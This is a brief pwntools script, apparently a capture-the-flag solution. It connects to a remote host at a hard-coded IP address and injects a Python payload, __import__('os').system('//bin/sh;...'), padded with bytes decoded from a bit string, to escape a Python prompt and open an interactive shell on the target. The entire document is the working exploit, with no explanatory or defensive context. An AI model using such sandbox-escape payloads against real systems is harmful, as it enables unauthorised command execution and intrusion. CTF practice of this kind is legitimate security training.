from Crypto.Util.number import *
from pwn import *

io = remote("101.34.72.206", "1339")
padding = '01101101001100100001110101000010'
padding = long_to_bytes(int(padding, 2)).decode()
head = "__import__('os').system('//bin/sh;"
tail = "')"

io.sendlineafter(">>> ", head+padding+tail)
io.interactive()